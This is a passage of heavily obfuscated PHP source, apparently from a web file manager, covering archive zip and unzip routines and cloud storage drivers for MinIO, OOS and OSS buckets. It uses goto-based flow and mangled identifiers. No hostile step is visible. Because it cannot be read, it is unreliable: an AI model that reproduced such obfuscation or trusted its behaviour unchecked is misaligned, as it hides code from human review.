aİ‚¸œ‡‡: $eŒ…è¬ÃÒ = self::$driverCache[$FİğØÙÓ®Ø]; $eŒ…è¬ÃÒ->pathDriver = $f‹áÒò£Ù; $eŒ…è¬ÃÒ->pathBase = $cñ½ËØµï[33]; goto c…«Ù™¹Ï; c…«Ù™¹Ï: if (isset($c¥÷íß¡ìÃ[$cñ½ËØµï[6]][$cñ½ËØµï[1040]])) { $eŒ…è¬ÃÒ->pathBase = rtrim($c¥÷íß¡ìÃ[$cñ½ËØµï[6]][$cñ½ËØµï[1040]], $cñ½ËØµï[8]) . $cñ½ËØµï[8]; $Cñè„©È‚ö = $eŒ…è¬ÃÒ->pathBase . ltrim($Cñè„©È‚ö, $cñ½ËØµï[8]); } $Cñè„©È‚ö = $eŒ…è¬ÃÒ->getPath($Cñè„©È‚ö); if (isset($B‡ÌîĞŞÛ[$cñ½ËØµï[1012]])) { $Cñè„©È‚ö = $B‡ÌîĞŞÛ[$cñ½ËØµï[1012]]; } goto fØ¯·¨¾ßÀ; Fé„¹Ô„Ü·: } public static function errorTips($aôÓâÄêÍŒ = false) { goto cÃ‚†ó‚§; b‚¾‰ÒŠ‡â: $bËõŠ®Äƒ¼[] = $aôÓâÄêÍŒ; write_log($AƒĞ¦ËªÛ˜[157] . ACTION . $AƒĞ¦ËªÛ˜[1041] . $aôÓâÄêÍŒ, $AƒĞ¦ËªÛ˜[1042]); goto BÅ¥ÃĞ÷’ˆ; F‡¹ˆ®¤Î: if ($aôÓâÄêÍŒ === -1) { return $bËõŠ®Äƒ¼ ? $bËõŠ®Äƒ¼[count($bËõŠ®Äƒ¼) - 1] : $AƒĞ¦ËªÛ˜[33]; } if ($aôÓâÄêÍŒ === !1) { return implode($AƒĞ¦ËªÛ˜[225], $bËõŠ®Äƒ¼); } if (count($bËõŠ®Äƒ¼) >= $e·Ü¡İ«å˜) { $bËõŠ®Äƒ¼ = array_slice($bËõŠ®Äƒ¼, $e·Ü¡İ«å˜ * 0.5, $e·Ü¡İ«å˜); } goto b‚¾‰ÒŠ‡â; cÃ‚†ó‚§: $AƒĞ¦ËªÛ˜ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $bËõŠ®Äƒ¼ = array(); $e·Ü¡İ«å˜ = 1000; goto F‡¹ˆ®¤Î; BÅ¥ÃĞ÷’ˆ: } public static function getLastError($fªô®ÇÚ… = '') { $AîåÄÜê´¯ = self::errorTips(-1); return $AîåÄÜê´¯ ? $AîåÄÜê´¯ : $fªô®ÇÚ…; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Aº´¼‘ø˜; if (!$Aº´¼‘ø˜) { $dÌ‚‘½Úï = IO::init($_SERVER[ÈİÅ¿ÈÈ¥×][8]); } return $dÌ‚‘½Úï; } private static function iconvSystem($F¼±„ŸÜç) { return self::local()->iconvSystem($F¼±„ŸÜç); } private static function iconvApp($d«–™ĞÆœ›) { return self::local()->iconvApp($d«–™ĞÆœ›); } public static function zip($dîçÁ·™š´, $fŞÉà‚„Ï¬ = "\172\151\x70", $fñ¬×Ú¶¤ = '', $a¶Ç…ÓÈ·¹ = REPEAT_RENAME) { goto d·ÁÉËå³ï; A­„ğÂ‹: if (count($a½ÙÚ¿ÚÃè) > 1) { $CËÀ¿¦››Å = IO::info(IO::pathFather($Bùƒù…×ÕÌ[$cÆƒ¡À©Ÿ­[75]])); $b¦Öôµóİ– = $CËÀ¿¦››Å[$cÆƒ¡À©Ÿ­[28]]; } $F×âï¥¸ = $DòæğÉšÜç; if (!$F×âï¥¸) { $F×âï¥¸ = get_path_father($Bùƒù…×ÕÌ[$cÆƒ¡À©Ÿ­[75]]); if (!$fñ¬×Ú¶¤ && $aè¤œëÀŠò->getType() == $cÆƒ¡À©Ÿ­[102]) { $F×âï¥¸ = get_path_father($aè¤œëÀŠò->path); } $e¾µ¿ö»Ñ = IO::info($F×âï¥¸); if (!$e¾µ¿ö»Ñ[$cÆƒ¡À©Ÿ­[192]]) { show_json(LNG($cÆƒ¡À©Ÿ­[1044]), !1); } } goto F¨µ÷ğ×ø«; e·…œñË‚Ä: if (!$D¨Ôö‘‡á”) { del_dir($DòæğÉšÜç); show_json(LNG($cÆƒ¡À©Ÿ­[1045]), !1); } del_dir($DòæğÉšÜç); return $D¨Ôö‘‡á”; goto DÔ¸Ø•Áª„; c¦÷Ç¦‘ø: foreach ($a½ÙÚ¿ÚÃè as $AŸ™•Ù×îù => $cÙåäÏî¿) { $a½ÙÚ¿ÚÃè[$AŸ™•Ù×îù] = self::iconvSystem($cÙåäÏî¿); } KodArchive::create($e•¼ÕÁ¿¢·, $a½ÙÚ¿ÚÃè); if (!IO::exist($b›†…Ÿ®ˆ)) { if ($DòæğÉšÜç) { del_dir($DòæğÉšÜç); } show_json(LNG($cÆƒ¡À©Ÿ­[1045]), !1); } goto B¡Õ³…ôŸä; d·ÁÉËå³ï: $cÆƒ¡À©Ÿ­ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aè¤œëÀŠò = self::init($dîçÁ·™š´[0][$cÆƒ¡À©Ÿ­[75]]); $Bùƒù…×ÕÌ = self::info($dîçÁ·™š´[0][$cÆƒ¡À©Ÿ­[75]]); goto F¿®äìß Ü; F¿®äìß Ü: $DòæğÉšÜç = !1; if (!$fñ¬×Ú¶¤ && $aè¤œëÀŠò->getType() == $cÆƒ¡À©Ÿ­[102]) { $a½ÙÚ¿ÚÃè = self::zipFileList($dîçÁ·™š´); } else { $DòæğÉšÜç = $fñ¬×Ú¶¤ ? $fñ¬×Ú¶¤ : TEMP_FILES . $cÆƒ¡À©Ÿ­[1043] . time() . rand_string(8) . $cÆƒ¡À©Ÿ­[8]; mk_dir($DòæğÉšÜç); $a½ÙÚ¿ÚÃè = self::zipFileList($dîçÁ·™š´, $DòæğÉšÜç); } $b¦Öôµóİ– = $Bùƒù…×ÕÌ[$cÆƒ¡À©Ÿ­[28]]; goto A­„ğÂ‹; B¡Õ³…ôŸä: if ($fñ¬×Ú¶¤ || !$DòæğÉšÜç) { if ($DòæğÉšÜç && strstr($DòæğÉšÜç, TEMP_FILES)) { $eöäĞ†‘Ö = $a½ÙÚ¿ÚÃè = array(); recursion_dir($F×âï¥¸, $eöäĞ†‘Ö, $a½ÙÚ¿ÚÃè, 0); foreach ($eöäĞ†‘Ö as $C”’ÒéÊª²) { del_dir($C”’ÒéÊª²); } foreach ($a½ÙÚ¿ÚÃè as $C·»ƒÆ×°³) { if ($C·»ƒÆ×°³ == $e•¼ÕÁ¿¢·) { continue; } del_file($C·»ƒÆ×°³); } } return $b›†…Ÿ®ˆ; } $d˜ğÇ‰¦Ÿ = self::pathFather($Bùƒù…×ÕÌ[$cÆƒ¡À©Ÿ­[75]]); $D¨Ôö‘‡á” = self::move($b›†…Ÿ®ˆ, $d˜ğÇ‰¦Ÿ, $a¶Ç…ÓÈ·¹); goto e·…œñË‚Ä; F¨µ÷ğ×ø«: $b›†…Ÿ®ˆ = $F×âï¥¸ . $b¦Öôµóİ– . $cÆƒ¡À©Ÿ­[91] . $fŞÉà‚„Ï¬; $b›†…Ÿ®ˆ = get_filename_auto($b›†…Ÿ®ˆ, $cÆƒ¡À©Ÿ­[33], $a¶Ç…ÓÈ·¹); $e•¼ÕÁ¿¢· = self::iconvSystem($b›†…Ÿ®ˆ); goto c¦÷Ç¦‘ø; DÔ¸Ø•Áª„: } public static function unzip($cç­§•¾Õ±, $EÆÜêÙ¥£Ä = "\162\145\160\154\x61\143\x65") { goto EÄ½øŞÅ; fÙßå©Å›: mk_dir($CöÙ½¦…¾); $EİŒ³¹—Ç¦ = self::fileExt($D¶âš¿ÂƒÕ); $fÊæñ÷æ” = $CöÙ½¦…¾ . $BßÍ¶ÀèÔğ[91] . $EİŒ³¹—Ç¦; goto D²ì½ÄÜ×; a¸ÁŠ…ˆ”‘: if (!($D¶âš¿ÂƒÕ = parent::info($FÉÛ†‚ƒî))) { show_json(LNG($BßÍ¶ÀèÔğ[1047]), !1); } if (!($DáÀ‡ø†É = parent::infoFull($a°ÀŒ‰¡Ä))) { $a°ÀŒ‰¡Ä = parent::mkdir($a°ÀŒ‰¡Ä); $DáÀ‡ø†É = array($BßÍ¶ÀèÔğ[75] => $a°ÀŒ‰¡Ä); } else { if (isset($DáÀ‡ø†É[$BßÍ¶ÀèÔğ[385]]) && trim($DáÀ‡ø†É[$BßÍ¶ÀèÔğ[75]], $BßÍ¶ÀèÔğ[8]) != trim($a°ÀŒ‰¡Ä, $BßÍ¶ÀèÔğ[8])) { $D²–›²ˆ¼Ü = KodIO::make($DáÀ‡ø†É[$BßÍ¶ÀèÔğ[478]]); $bĞ‰ÒÂÓ = parent::fileNameAuto($D²–›²ˆ¼Ü, $DáÀ‡ø†É[$BßÍ¶ÀèÔğ[28]], REPEAT_RENAME_FOLDER, !0); $a°ÀŒ‰¡Ä = parent::mkdir($D²–›²ˆ¼Ü . $bĞ‰ÒÂÓ); $DáÀ‡ø†É = array($BßÍ¶ÀèÔğ[75] => $a°ÀŒ‰¡Ä); } } $a°ÀŒ‰¡Ä = $DáÀ‡ø†É[$BßÍ¶ÀèÔğ[75]]; goto A‘ƒ¡ÆêÜ¶; D²ì½ÄÜ×: if (!@file_exists(self::iconvSystem($fÊæñ÷æ”))) { $e©Ø‚ÏäÖİ = self::localFilePath($FÉÛ†‚ƒî, $EİŒ³¹—Ç¦); $fÊæñ÷æ” = $e©Ø‚ÏäÖİ ? $e©Ø‚ÏäÖİ : parent::download($FÉÛ†‚ƒî, $fÊæñ÷æ”); } $fÊæñ÷æ” = self::iconvSystem($fÊæñ÷æ”); $AÈÆã‹ööÙ = isset($cç­§•¾Õ±[$BßÍ¶ÀèÔğ[1048]]) ? $cç­§•¾Õ±[$BßÍ¶ÀèÔğ[1048]] : $BßÍ¶ÀèÔğ[1049]; goto C¶†Ì¥Šç; AôŠ¹Ã‘ìª: foreach ($bÓˆ†—Âö as $E„íºÊÀà³) { $E„íºÊÀà³ = self::iconvApp($E„íºÊÀà³); self::move($E„íºÊÀà³, $a°ÀŒ‰¡Ä, $EÆÜêÙ¥£Ä); } del_dir($CöÙ½¦…¾); if (!$e©Ø‚ÏäÖİ) { del_file($fÊæñ÷æ”); } goto D…î¦ÛÓõ—; C¶†Ì¥Šç: $F°ÂàĞëêù = KodArchive::extract($fÊæñ÷æ”, $CöÙ½¦…¾ . $BßÍ¶ÀèÔğ[8], $AÈÆã‹ööÙ); self::archiveExt(); if (!$F°ÂàĞëêù[$BßÍ¶ÀèÔğ[1050]]) { show_json($BßÍ¶ÀèÔğ[1051] . $F°ÂàĞëêù[$BßÍ¶ÀèÔğ[1052]], !1); } goto B‘œ¥¿ÆòÕ; A‘ƒ¡ÆêÜ¶: $f°ÜÈ¸É› = self::tmpFileName($D¶âš¿ÂƒÕ); $CöÙ½¦…¾ = TEMP_FILES . $f°ÜÈ¸É›; del_dir($CöÙ½¦…¾); goto fÙßå©Å›; B‘œ¥¿ÆòÕ: Hook::trigger($BßÍ¶ÀèÔğ[1053], $CöÙ½¦…¾); recursion_dir($CöÙ½¦…¾, $FÛë¨öÍªÖ, $fˆ„„‹„ê¬, 0); $bÓˆ†—Âö = array_merge($FÛë¨öÍªÖ, $fˆ„„‹„ê¬); goto AôŠ¹Ã‘ìª; D…î¦ÛÓõ—: return !0; goto d£ÛØÉ„Ÿ; EÄ½øŞÅ: $BßÍ¶ÀèÔğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÉÛ†‚ƒî = $cç­§•¾Õ±[$BßÍ¶ÀèÔğ[75]]; $a°ÀŒ‰¡Ä = $cç­§•¾Õ±[$BßÍ¶ÀèÔğ[1046]]; goto a¸ÁŠ…ˆ”‘; d£ÛØÉ„Ÿ: } public static function unzipList($F‹İ¦®ª¹) { goto Cš÷æÌÜÈó; e¥µ„Ş‡: $E‡ÀŞÑó–ä = json_encode($E´ÛØïƒ¿°[$Eå àÑ’¸ù[1052]]); self::setContent($Fß¤¡áÜÆ, $E‡ÀŞÑó–ä); if (count($E´ÛØïƒ¿°[$Eå àÑ’¸ù[1052]]) >= $Fõñ÷å«ù‘) { show_json(sprintf(LNG($Eå àÑ’¸ù[1056]), count($E´ÛØïƒ¿°[$Eå àÑ’¸ù[1052]])), !1); } goto D Ğ¥¸œ; C©¬¼íßË„: self::archiveExt(); del_dir($FÉö¯¥²Î¦); if (!$E´ÛØïƒ¿°[$Eå àÑ’¸ù[1050]]) { show_json($E´ÛØïƒ¿°[$Eå àÑ’¸ù[1052]], !1); } goto e¥µ„Ş‡; d›ÙÕâ†Ö: $BÌÕÓ„æø = self::iconvSystem($BÌÕÓ„æø); if ($B‰ñÒ„À…Â >= 0) { $B²‹ôÎ¾ = isset($F‹İ¦®ª¹[$Eå àÑ’¸ù[1058]]) ? $F‹İ¦®ª¹[$Eå àÑ’¸ù[1058]] : !1; $AÂì¢ó¨¢ = isset($F‹İ¦®ª¹[$Eå àÑ’¸ù[28]]) ? $F‹İ¦®ª¹[$Eå àÑ’¸ù[28]] : $Eå àÑ’¸ù[33]; KodArchive::filePreview($BÌÕÓ„æø, $B‰ñÒ„À…Â, $B²‹ôÎ¾, $AÂì¢ó¨¢); self::archiveExt(); die; } $E´ÛØïƒ¿° = KodArchive::listContent($BÌÕÓ„æø); goto C©¬¼íßË„; D²·ñ™ÑÓÙ: if (isset($D°„¶‹êÈ¦)) { $c¤¤à¿ò¦œ = array($D°„¶‹êÈ¦[$Eå àÑ’¸ù[75]], $D°„¶‹êÈ¦[$Eå àÑ’¸ù[1054]], $D°„¶‹êÈ¦[$Eå àÑ’¸ù[28]]); $EğÕöØªŒ† = md5(implode($Eå àÑ’¸ù[70], $c¤¤à¿ò¦œ)) . $Eå àÑ’¸ù[91] . get_path_ext($D°„¶‹êÈ¦[$Eå àÑ’¸ù[28]]); } else { $c¤¤à¿ò¦œ = array($böã®ƒ›ÕÖ[$Eå àÑ’¸ù[28]], $böã®ƒ›ÕÖ[$Eå àÑ’¸ù[75]], $böã®ƒ›ÕÖ[$Eå àÑ’¸ù[77]]); $EğÕöØªŒ† = md5(implode($Eå àÑ’¸ù[70], $c¤¤à¿ò¦œ)) . $Eå àÑ’¸ù[91] . $b†¶÷‰±µ; } if ($B‰ñÒ„À…Â == -1) { $Fß¤¡áÜÆ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\x69\145\167\x2f{$bÇ…»š„İ}\57{$EğÕöØªŒ†}\56\x6c\x6f\x67"; $E†é¾´© = self::infoFull($Fß¤¡áÜÆ); if ($E†é¾´©) { $Fß¤¡áÜÆ = $E†é¾´©[$Eå àÑ’¸ù[75]]; $c·»İéãŞ… = self::getContent($Fß¤¡áÜÆ); if ($c·»İéãŞ…) { $E‡ÀŞÑó–ä = json_decode($c·»İéãŞ…, !0); if (count($E‡ÀŞÑó–ä) >= $Fõñ÷å«ù‘) { show_json(sprintf(LNG($Eå àÑ’¸ù[1056]), count($E‡ÀŞÑó–ä)), !1); } return $E‡ÀŞÑó–ä; } } else { $Fß¤¡áÜÆ = self::mkfile($Fß¤¡áÜÆ); } } $FÉö¯¥²Î¦ = TEMP_FILES . $bÇ…»š„İ; goto c·‰ãˆ†ó; FÈİÜõ‹¼…: $Fõñ÷å«ù‘ = 50000; if (request_url_safe($Aßƒ¶Ò‰‹)) { $D°„¶‹êÈ¦ = parse_url_query($Aßƒ¶Ò‰‹); if (!isset($D°„¶‹êÈ¦[$Eå àÑ’¸ù[75]])) { show_json($Eå àÑ’¸ù[1055], !1); } } $b‡ª™‚œæÀ = isset($D°„¶‹êÈ¦) ? $D°„¶‹êÈ¦[$Eå àÑ’¸ù[75]] : $Aßƒ¶Ò‰‹; goto AÇ¾ï­‹óà; AÇ¾ï­‹óà: $böã®ƒ›ÕÖ = self::info($b‡ª™‚œæÀ); $b†¶÷‰±µ = self::fileExt($böã®ƒ›ÕÖ); $bÇ…»š„İ = self::tmpFileName($böã®ƒ›ÕÖ); goto D²·ñ™ÑÓÙ; c·‰ãˆ†ó: if (!is_dir($FÉö¯¥²Î¦)) { mk_dir($FÉö¯¥²Î¦); } $BÌÕÓ„æø = $FÉö¯¥²Î¦ . $Eå àÑ’¸ù[8] . $EğÕöØªŒ†; if (!@file_exists(self::iconvSystem($BÌÕÓ„æø))) { if (isset($D°„¶‹êÈ¦)) { url_request($Aßƒ¶Ò‰‹, $Eå àÑ’¸ù[1057], $BÌÕÓ„æø); } else { $bè—³†ËÄ„ = self::localFilePath($Aßƒ¶Ò‰‹, $b†¶÷‰±µ); $BÌÕÓ„æø = $bè—³†ËÄ„ ? $bè—³†ËÄ„ : self::download($Aßƒ¶Ò‰‹, $BÌÕÓ„æø); } } goto d›ÙÕâ†Ö; Cš÷æÌÜÈó: $Eå àÑ’¸ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aßƒ¶Ò‰‹ = $F‹İ¦®ª¹[$Eå àÑ’¸ù[75]]; $B‰ñÒ„À…Â = isset($F‹İ¦®ª¹[$Eå àÑ’¸ù[1054]]) ? $F‹İ¦®ª¹[$Eå àÑ’¸ù[1054]] : -1; goto FÈİÜõ‹¼…; D Ğ¥¸œ: return $E´ÛØïƒ¿°[$Eå àÑ’¸ù[1052]]; goto a˜İíÏåØ ; a˜İíÏåØ : } private static function fileExt($EâŒÊÈğñ) { $Eà•ºáÖÕò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¬ö„Ñ·Šä = $EâŒÊÈğñ[$Eà•ºáÖÕò[165]]; if ($b¬ö„Ñ·Šä == $Eà•ºáÖÕò[1059]) { $d âÁÁöÈ½ = $Eà•ºáÖÕò[1060]; if (substr($EâŒÊÈğñ[$Eà•ºáÖÕò[28]], -strlen($d âÁÁöÈ½)) == $d âÁÁöÈ½) { $b¬ö„Ñ·Šä = $Eà•ºáÖÕò[1061]; } } self::archiveExt($b¬ö„Ñ·Šä); return $b¬ö„Ñ·Šä; } private static function zipFileList($EºÒÚÊ¬‰Ø, $FœØŒÂº = false) { $e°—Øà˜Ğö =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÆŠ›˜¸¢ = array(); foreach ($EºÒÚÊ¬‰Ø as $B†áòœƒ‚•) { $aÛÊµƒ’Öê = $B†áòœƒ‚•[$e°—Øà˜Ğö[75]]; if ($FœØŒÂº) { $aÛÊµƒ’Öê = self::copy($B†áòœƒ‚•[$e°—Øà˜Ğö[75]], $FœØŒÂº, $e°—Øà˜Ğö[752]); } else { $E¡£‡‹Ëé = self::init($B†áòœƒ‚•[$e°—Øà˜Ğö[75]]); if ($E¡£‡‹Ëé->getType() == $e°—Øà˜Ğö[102]) { $aÛÊµƒ’Öê = $E¡£‡‹Ëé->path; } } if ($aÛÊµƒ’Öê && self::local()->exist($aÛÊµƒ’Öê)) { $BÆŠ›˜¸¢[$B†áòœƒ‚•[$e°—Øà˜Ğö[75]]] = $aÛÊµƒ’Öê; } } if (!empty($BÆŠ›˜¸¢)) { return array_values($BÆŠ›˜¸¢); } show_json(LNG($e°—Øà˜Ğö[1025]), !1); } public static function tmpFileName($Aì÷ç—„Âà) { $b—•Î‹©¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÒùòâ·Á° = array($Aì÷ç—„Âà[$b—•Î‹©¦[28]], $Aì÷ç—„Âà[$b—•Î‹©¦[75]], $Aì÷ç—„Âà[$b—•Î‹©¦[77]], $Aì÷ç—„Âà[$b—•Î‹©¦[476]]); return md5(implode($b—•Î‹©¦[70], $CÒùòâ·Á°)); } private static function localFilePath($E¦Øì¸Õ‚È, $A¬ ‘‡“Í) { goto eÕ¤¨Á¥¤š; cñ‚£âÆ: if ($eÖŞñÎŒ÷ == $Eô»•æŞóå[102] || $eÖŞñÎŒ÷ == $Eô»•æŞóå[1065]) { if (!$e¤ÚÙŒéØ->exist($e¤ÚÙŒéØ->path)) { show_json(LNG($Eô»•æŞóå[101]), !1); } return $e¤ÚÙŒéØ->path; } return !1; goto cë×óÀÏÅ·; eÕ¤¨Á¥¤š: $Eô»•æŞóå =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($A¬ ‘‡“Í == $Eô»•æŞóå[1062] && strtoupper(substr(PHP_OS, 0, 3)) == $Eô»•æŞóå[1063]) { return !1; } $fö¬“âñÎâ = KodIO::parse($E¦Øì¸Õ‚È); goto d£óÔÂã‚ˆ; d£óÔÂã‚ˆ: if ($fö¬“âñÎâ[$Eô»•æŞóå[29]] == KodIO::KOD_SOURCE) { $Cóæ§¥·æ“ = Model($Eô»•æŞóå[759])->fileInfoGet(KodIO::sourceID($E¦Øì¸Õ‚È)); if (!$Cóæ§¥·æ“[$Eô»•æŞóå[75]]) { show_json($Eô»•æŞóå[1064], !1); } $E¦Øì¸Õ‚È = $Cóæ§¥·æ“[$Eô»•æŞóå[75]]; } $e¤ÚÙŒéØ = self::init($E¦Øì¸Õ‚È); $eÖŞñÎŒ÷ = $e¤ÚÙŒéØ->getType(); goto cñ‚£âÆ; cë×óÀÏÅ·: } private static function archiveExt($eÒèçÉ°Ó¯ = '') { $GLOBALS[$_SERVER[ÈİÅ¿ÈÈ¥×][1066]] = $eÒèçÉ°Ó¯; } } goto DŒ¡è‘™‘ƒ; b¤®Á¼İÄ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($CæåºØ‰„˜) { parent::__construct($CæåºØ‰„˜); $this->signatureVersion($_SERVER[ÈİÅ¿ÈÈ¥×][208]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($FĞ£ó”È¯È) { parent::__construct($FĞ£ó”È¯È); $this->signatureVersion($_SERVER[ÈİÅ¿ÈÈ¥×][208]); } public function fileOutLink($FøÖ®ù«×Å) { $fâ°Û–ºíÏ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (substr($FøÖ®ù«×Å, 0, 7) == $fâ°Û–ºíÏ[1165]) { $FøÖ®ù«×Å = $fâ°Û–ºíÏ[1166] . substr($FøÖ®ù«×Å, 7); } header($fâ°Û–ºíÏ[156] . $FøÖ®ù«×Å); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($d‚„ÆÉ¢ññ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÈİÅ¿ÈÈ¥×][1220]; $this->_init($d‚„ÆÉ¢ññ); } public function _init($EØÑ×™Èˆ¨) { $b‰¡ªÔä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; foreach ($EØÑ×™Èˆ¨ as $eÜ²…´Ù“â => $fÉİÔ›Æ) { if (isset($this->{$eÜ²…´Ù“â})) { $this->{$eÜ²…´Ù“â} = $fÉİÔ›Æ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($b‰¡ªÔä[1221] . LNG($b‰¡ªÔä[1222])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B’¾åô‡‹™; e´éèä©§Õ: $A¯×ãùòá¶->addRule($DäÆãáï¥); try { $this->client->putBucketCors($this->bucket, $A¯×ãùòá¶); } catch (OSS\Core\OssException $b”Ûàù©ò˜) { return !1; } return !0; goto A“Ì¯•â…; d›Á›¸¡á: $DäÆãáï¥->addAllowedOrigin($E¥Šèæˆ[1223]); $DäÆãáï¥->addAllowedMethod($E¥Šèæˆ[1224]); $DäÆãáï¥->addAllowedMethod($E¥Šèæˆ[1225]); goto Fø¾¶“¿ÒÆ; Fß¤«É¼º‡: $DäÆãáï¥->setMaxAgeSeconds(600); $DäÆãáï¥->addExposeHeader($E¥Šèæˆ[1228]); $DäÆãáï¥->addAllowedHeader($E¥Šèæˆ[1223]); goto e´éèä©§Õ; B’¾åô‡‹™: $E¥Šèæˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¯×ãùòá¶ = new OSS\Model\CorsConfig(); $DäÆãáï¥ = new OSS\Model\CorsRule(); goto d›Á›¸¡á; Fø¾¶“¿ÒÆ: $DäÆãáï¥->addAllowedMethod($E¥Šèæˆ[1226]); $DäÆãáï¥->addAllowedMethod($E¥Šèæˆ[1227]); $DäÆãáï¥->addAllowedMethod($E¥Šèæˆ[155]); goto Fß¤«É¼º‡; A“Ì¯•â…: } public function getBucketCors() { goto FÌ¦ìâê¥Õ; b¬¾’•‰†: return array($FŒí¢¼½æ¼[179] => isset($eùÜâœ…Äª[0]) ? $eùÜâœ…Äª[0] : $FŒí¢¼½æ¼[33], $FŒí¢¼½æ¼[183] => $b£Åñ, $FŒí¢¼½æ¼[1229] => $b¬é÷Œ—÷ç, $FŒí¢¼½æ¼[1230] => isset($aŸ„æêÉ÷[0]) ? $aŸ„æêÉ÷[0] : $FŒí¢¼½æ¼[33], $FŒí¢¼½æ¼[181] => isset($Dõõ·áÌ³Ù[0]) ? $Dõõ·áÌ³Ù[0] : $FŒí¢¼½æ¼[33]); goto eÚäÅòƒŠ ; cÜ‘İîºç: if (!$dé—Ì÷ÎÖß || !($bçœÄŒô†Å = $dé—Ì÷ÎÖß->getRules())) { return null; } $eùÜâœ…Äª = $bçœÄŒô†Å[0]->getAllowedOrigins(); $b£Åñ = $bçœÄŒô†Å[0]->getAllowedMethods(); goto fÌó„³é¶ò; FÌ¦ìâê¥Õ: $FŒí¢¼½æ¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dé—Ì÷ÎÖß = null; try { $dé—Ì÷ÎÖß = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $eô·¦˜©‘¥) { return null; } goto cÜ‘İîºç; fÌó„³é¶ò: $b¬é÷Œ—÷ç = $bçœÄŒô†Å[0]->getMaxAgeSeconds(); $aŸ„æêÉ÷ = $bçœÄŒô†Å[0]->getExposeHeaders(); $Dõõ·áÌ³Ù = $bçœÄŒô†Å[0]->getAllowedHeaders(); goto b¬¾’•‰†; eÚäÅòƒŠ : } public function isBucketCors() { goto A’æÎÃ¶ºí; A’æÎÃ¶ºí: $e·›Ë°Å¯ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÊÕ¡ïã« = $this->getBucketCors(); if (!$aÊÕ¡ïã« || !is_array($aÊÕ¡ïã«)) { return !1; } goto cÙàà‘¯ó; cÙàà‘¯ó: if ($aÊÕ¡ïã«[$e·›Ë°Å¯[179]] != $e·›Ë°Å¯[180] || $aÊÕ¡ïã«[$e·›Ë°Å¯[181]] != $e·›Ë°Å¯[180]) { return !1; } $aïªÄ°ØìÀ = array_map($e·›Ë°Å¯[182], $aÊÕ¡ïã«[$e·›Ë°Å¯[183]]); if (!is_array($aïªÄ°ØìÀ)) { $aïªÄ°ØìÀ = array(); } goto F©ŠƒÉ©Ì‚; F©ŠƒÉ©Ì‚: $CµŞÍÓ‰÷ = array($e·›Ë°Å¯[184], $e·›Ë°Å¯[185], $e·›Ë°Å¯[186], $e·›Ë°Å¯[187], $e·›Ë°Å¯[188]); $DäÑçÄÀ«Ç = array_diff($CµŞÍÓ‰÷, $aïªÄ°ØìÀ); return empty($DäÑçÄÀ«Ç); goto Fí÷Åš­ ; Fí÷Åš­ : } public function mkfile($CØÍ³Ç‡µ, $fÒø§…øó¼ = '', $FëÀÎ±ºá† = REPEAT_RENAME) { $FÀÅ¿š«¼ = $this->setContent($CØÍ³Ç‡µ, $fÒø§…øó¼); if ($FÀÅ¿š«¼ !== !1) { return $this->getPathOuter($CØÍ³Ç‡µ); } return !1; } public function mkdir($Fê®¼µ„ˆ, $A’Ö¶ÄÑ¼ = REPEAT_SKIP) { if ($this->_isFolder($Fê®¼µ„ˆ)) { return $this->getPathOuter($Fê®¼µ„ˆ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Fê®¼µ„ˆ)); } catch (OSS\Core\OssException $bìŒùÂß¢”) { return !1; } return $this->getPathOuter($Fê®¼µ„ˆ); } private function fileList($C†· §” ¨, $A‡âËî£â = '', $E¾Üßßİİ§ = 0) { goto Cµîœù³ò; Eé‹ÛÇ×ÁÀ: return array($dÀÚ³îÄ÷[74] => $B«‚«¯…ÄĞ, $dÀÚ³îÄ÷[73] => $e³ô½·×Ô”); goto a­ÆåÌÃ½´; a—ò¿„£: $F…ƒêìÀòÃ = $dÀÚ³îÄ÷[33]; $Fğì¯‰Ù = 1000; $f‡èÅ ×„ = $this->listItemCache === !1 ? !1 : !0; goto A‡”­²¼õ; Cµîœù³ò: $dÀÚ³îÄ÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C†· §” ¨ = trim($C†· §” ¨, $dÀÚ³îÄ÷[8]); $Cö¡­©Ü‹Ê = empty($C†· §” ¨) ? $dÀÚ³îÄ÷[33] : $C†· §” ¨ . $dÀÚ³îÄ÷[8]; goto a—ò¿„£; A‡”­²¼õ: $B«‚«¯…ÄĞ = $e³ô½·×Ô” = array(); while (!0) { check_abort(); $B“ª‘îñÚ = array($dÀÚ³îÄ÷[1231] => $A‡âËî£â, $dÀÚ³îÄ÷[1232] => $Cö¡­©Ü‹Ê, $dÀÚ³îÄ÷[1233] => $Fğì¯‰Ù, $dÀÚ³îÄ÷[1234] => $F…ƒêìÀòÃ); try { $eæ–¥ŒŠÄ‰ = $this->client->listObjects($this->bucket, $B“ª‘îñÚ); } catch (OSS\Core\OssException $f®Àñ³”Ö) { break; } $F…ƒêìÀòÃ = $eæ–¥ŒŠÄ‰->getNextMarker(); $D¸´é±‹— = $eæ–¥ŒŠÄ‰->getObjectList(); $DÂ¶°‡è¹ = 